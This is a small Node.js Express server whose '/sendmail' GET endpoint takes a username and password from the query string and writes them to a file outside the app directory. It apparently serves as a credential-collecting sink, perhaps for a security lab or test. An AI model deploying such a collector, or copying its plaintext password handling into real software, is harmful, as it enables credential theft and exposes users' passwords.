app = require('express')();
fs = require('fs');

app.get('/sendmail', function(req, res) {
  const query = req.query;
  const sender = query.username;
  const [username, password] = query.payload.split(' ');
  const file = fs.createWriteStream('../mail');
  file.write(`From: ${sender}\n\n`);
  file.end(`username: ${username}\npassword: ${password}\n`);

  res.send();
});

app.listen(3000, function() {
  console.log('Listening on 3000!');
});